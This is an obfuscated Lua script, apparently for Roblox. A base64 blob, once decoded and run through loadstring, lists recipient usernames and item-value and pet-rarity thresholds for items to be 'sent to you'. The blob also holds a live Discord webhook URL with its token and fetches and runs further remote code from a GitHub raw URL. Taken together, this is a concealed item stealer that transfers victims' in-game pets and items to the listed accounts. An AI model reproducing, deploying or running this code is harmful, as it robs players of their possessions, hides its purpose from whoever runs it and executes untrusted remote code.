
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJnaXZlbWVmb3J0bml0ZXZidWNrIiwKICAgICJnaXZlbWVmb3J0bml0ZXZidWNrIiwKICAgICJnaXZlbWVmb3J0bml0ZXZidWNrIiwKfQptaW5fcmFwID0gMTAwMDAwIC0tIG1pbmltdW0gcmFwIG9mIGVhY2ggaXRlbSB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UKbWluX2NoYW5jZSA9IDEwMDAgLS0gbWluaW11bSBjaGFuY2Ugb2YgcGV0cyB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UKd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzM5NTE0NTEyMTU1MzQ5MDAzL3FFNXlnQ2tGbUtzeG5qS3dQQ25jTk5QcXFyeFpqcXhkU3BOTDdidDZCb2h0UUM3ZVhlY0RFNlRCT3ZOUGlsVGVNcjd4Igpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wZXQlMjBnbyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()